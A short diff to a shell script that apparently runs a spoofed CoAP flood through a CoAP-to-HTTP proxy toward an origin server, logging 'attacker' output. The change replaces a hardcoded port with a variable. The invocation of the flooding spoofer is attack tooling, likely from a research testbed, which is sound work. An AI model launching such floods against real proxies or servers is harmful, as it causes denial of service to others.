@@ -17,7 +17,7 @@ my_ip="8.8.8.8"
   --code 001 \
   --uri-host $PROXY_IP \
   --uri-path coap2http \
-  --proxy-uri http://$ORIGIN_SERVER_IP:8000 \
+  --proxy-uri http://$ORIGIN_SERVER_IP:$ORIGIN_SERVER_PORT \
   --flood True > $TMP_DATA/$ATTACKER_LOGNAME) &
 
 spoofer_pid=$!
